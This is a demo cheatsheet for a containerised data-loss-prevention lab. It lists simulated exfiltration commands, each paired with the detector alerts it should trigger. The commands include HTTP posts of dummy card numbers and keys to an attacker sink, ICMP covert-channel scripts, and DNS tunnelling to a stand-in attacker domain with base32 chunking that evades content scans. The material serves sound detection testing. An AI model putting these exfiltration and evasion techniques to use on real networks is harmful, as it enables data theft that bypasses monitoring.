# DLPDetection - Live Demo Cheatsheet

## Setup Prerequisites
1. Start the stack: `docker compose up -d`
2. Terminal 1 (Gateway logs): `docker compose logs -f gateway`
3. Terminal 2 (Covert detector): `docker compose logs -f covert-detector`
4. Terminal 3 (Attacker Sinks):
   - For HTTP: `docker compose exec attacker python servers/http_sink.py`
   - For DNS: `docker compose exec attacker python servers/dns_sink.py`
   - For ICMP: `docker compose exec attacker python servers/icmp_sink.py`

## 1. Web L7 DLP Scenarios (HTTP Port 80)

### 1.1 Benign Traffic (Pass-Through)

- **Command (Victim):**
```bash
  docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "user=alice&status=ok"
```

- **Expected:** `HTTP/1.1 200 OK` on Victim, data received on Attacker sink, 0 alerts on Gateway.

### 1.2 Credit Card Exfiltration (Luhn Block)

- **Command (Victim):**
```bash
docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "card=4111-1111-1111-1111"
```

- **Expected:** `HTTP 403 Forbidden` on Victim, alert `luhn_cc` in Gateway logs, nothing received on Attacker sink.

### 1.3 AWS Key Exfiltration (Regex Block)

- **Command (Victim):**
```bash
docker compose exec victim curl -i -X POST http://172.21.0.10/ -d "token=AKIAIOSFODNN7EXAMPLE"
```

- **Expected:** `HTTP 403 Forbidden` on Victim, alert `AWS_ACCESS_KEY_ID` in Gateway logs, nothing received on Attacker sink.


## 2. Covert Channel Scenarios (L3/L4 ICMP)

### 2.1 Benign Diagnostic Ping (Baseline Pass-Through)
- **Command (Victim):**
  ```bash
  docker compose exec victim ping -c 2 172.21.0.10
  ```

- **Expected:** Normal packet debug logs in `covert-detector`, **0 DLP alerts** triggered.


### 2.2 Naive Bulk Exfiltration (Oversized Payload)

- **Command (Victim):**
  ```bash
  docker compose exec victim python attacks/icmp_exfiltrate.py --mode oversized
  ```

- **Expected Alert in `covert-detector`:**
  ╭─ ⚠  HIGH icmp_oversized_payload  ALLOWED  ──────────────────────────────╮
  │    Flow  172.20.0.3 → 172.21.0.10  (X:X:X · covert_icmp)                │
  │   Alert  Payload size (X bytes) exceeds standard threshold (64 bytes)   │
  │ Details  payload_size=X   threshold=64                                  │
  ╰─────────────────────────────────────────────────────────────────────────╯


### 2.3 Sensitive Data Exfiltration (L7 Inspection inside ICMP)

- **Command (Victim):**
  ```bash
  docker compose exec victim python attacks/icmp_exfiltrate.py --mode sensitive --data "4532015112830366"
  ```

- **Expected Alert in `covert-detector`:**
  ╭─ ⚠  HIGH icmp_sensitive_data_luhn_cc  ALLOWED  ──────────────────────────────╮
  │    Flow  172.20.0.3 → 172.21.0.10  (XX:XX:XX · covert_icmp)                  │
  │   Alert  Sensitive content detected in ICMP payload via rule 'luhn_cc'       │
  │ Details  matched=XXXXXXXXXXXXXXXX   detector=luhn   source=icmp_payload      │
  │          l7_rule_id=luhn_cc   digits=XX   issuing_network=XXXX               │
  ╰──────────────────────────────────────────────────────────────────────────────╯


### 2.4 Rapid Exfiltration Burst (Behavioral Rate Limiting)

- **Command (Victim):**
  ```bash
  docker compose exec victim python attacks/icmp_exfiltrate.py --mode burst --count 6 --delay 0.05
  ```

- **Expected Alert in `covert-detector`:**
  ╭─ ⚠  HIGH icmp_high_frequency  ALLOWED  ──────────────────────────────────────╮
  │    Flow  172.20.0.3 → 172.21.0.10  (XX:XX:XX · covert_icmp)                  │
  │   Alert  Abnormal ICMP Echo frequency: 5 requests in 1.0s from 172.20.0.3    │
  │          (threshold: 4)                                                      │
  │ Details  count=5   window_seconds=1.0   threshold=4   source_ip=172.20.0.3   │
  ╰──────────────────────────────────────────────────────────────────────────────╯
  ╭─ ⚠  HIGH icmp_high_frequency  ALLOWED  ──────────────────────────────────────╮
  │    Flow  172.20.0.3 → 172.21.0.10  (XX:XX:XX · covert_icmp)                  │
  │   Alert  Abnormal ICMP Echo frequency: 6 requests in 1.0s from 172.20.0.3    │
  │          (threshold: 4)                                                      │
  │ Details  count=6   window_seconds=1.0   threshold=4   source_ip=172.20.0.3   │
  ╰──────────────────────────────────────────────────────────────────────────────╯


## 3. Covert Channel Scenarios (DNS Tunneling)

The DNS attack script builds its own queries with the standard library (no
scapy) and sends them straight at the attacker's DNS sink; they traverse the
gateway, where the passive covert-detector inspects each QNAME. Make sure the
DNS sink is running (Terminal 3): `docker compose exec attacker python servers/dns_sink.py`.

> **Note:** the volume rule (`DNS_TUNNEL_VOLUME`) is stateful over a 60 s sliding
> window per source+apex, so unique-subdomain counts accumulate across runs. If
> you run several DNS scenarios back-to-back it may trip earlier than the panels
> below. For output that matches this guide exactly (especially 3.4), run on an
> idle detector or reset state first: `docker compose restart covert-detector`.

### 3.1 Benign DNS Lookup (Baseline Pass-Through)

- **Command (Victim):**
  ```bash
  docker compose exec victim python attacks/dns_exfiltrate.py --secret "hello world" --mode naive
  ```

- **Expected:** one short, readable query (`c0.hello-world.exfil.attacker.example`)
  reaches the sink; **0 DLP alerts** in `covert-detector` (stays under the length,
  entropy, and volume thresholds and carries no sensitive content).


### 3.2 Cleartext Sensitive Data (L7 Content Inspection on the QNAME)

- **Command (Victim):**
  ```bash
  docker compose exec victim python attacks/dns_exfiltrate.py --secret "VISA 4111111111111111" --mode naive
  ```

- **Expected Alerts in `covert-detector`:**
  ╭─ ⚠  MEDIUM DNS_LONG_QNAME  ALLOWED  ────────────────────────────────────────╮
  │    Flow  172.20.0.3 → attacker.example  (XX:XX:XX · DNS_COVERT)              │
  │ Details  qname=c0.VISA-4111111111111111.exfil.attacker.example   qtype=A     │
  │          longest_label=21   qname_len=47                                     │
  ╰──────────────────────────────────────────────────────────────────────────────╯
  ╭─ ⚠  HIGH DNS_SENSITIVE_DATA_LUHN_CC  ALLOWED  ──────────────────────────────╮
  │    Flow  172.20.0.3 → attacker.example  (XX:XX:XX · DNS_COVERT)              │
  │ Details  qname=c0.VISA-4111111111111111.exfil.attacker.example   qtype=A     │
  │          matched=4111111111111111   detector=luhn   source=dns_qname         │
  │          l7_rule_id=luhn_cc   digits=16   issuing_network=Visa               │
  ╰──────────────────────────────────────────────────────────────────────────────╯


### 3.3 Encoded Tunnel (High-Entropy Labels)

- **Command (Victim):**
  ```bash
  docker compose exec victim python attacks/dns_exfiltrate.py --secret "VISA 4111111111111111" --mode base32
  ```

- **Expected Alerts in `covert-detector`:** base32 defeats the cleartext content
  scan, but the random-looking label still trips the entropy and length rules.
  ╭─ ⚠  MEDIUM DNS_LONG_QNAME  ALLOWED  ────────────────────────────────────────╮
  │    Flow  172.20.0.3 → attacker.example  (XX:XX:XX · DNS_COVERT)              │
  │ Details  qname=c0.kzevgqjagqytcmjrgeytcmjrgeytcm.exfil.attacker.example      │
  │          qtype=A   longest_label=30   qname_len=56                           │
  ╰──────────────────────────────────────────────────────────────────────────────╯
  ╭─ ⚠  HIGH DNS_HIGH_ENTROPY  ALLOWED  ────────────────────────────────────────╮
  │    Flow  172.20.0.3 → attacker.example  (XX:XX:XX · DNS_COVERT)              │
  │ Details  qname=c0.kzevgqjagqytcmjrgeytcmjrgeytcm.exfil.attacker.example      │
  │          qtype=A   entropy=3.939   payload_len=37                            │
  ╰──────────────────────────────────────────────────────────────────────────────╯


### 3.4 High-Volume Tunnel (Behavioral Volume Rule)

- **Command (Victim):**
  ```bash
  docker compose exec victim python attacks/dns_exfiltrate.py \
    --secret "CONFIDENTIAL CUSTOMER EXPORT: 500 records of PII and card numbers attached" \
    --mode base32 --chunk-size 10
  ```

- **Expected Alert in `covert-detector`:** small chunks spread the payload across
  many unique subdomains under one apex; once eight distinct subdomains appear in
  the 60 s window, the volume rule fires (alongside per-query entropy alerts).
  ╭─ ⚠  HIGH DNS_TUNNEL_VOLUME  ALLOWED  ───────────────────────────────────────╮
  │    Flow  172.20.0.3 → attacker.example  (XX:XX:XX · DNS_COVERT)              │
  │ Details  qname=c7.rakbeusidb.exfil.attacker.example   qtype=A                │
  │          unique_subdomains=8   window_sec=60.0                               │
  ╰──────────────────────────────────────────────────────────────────────────────╯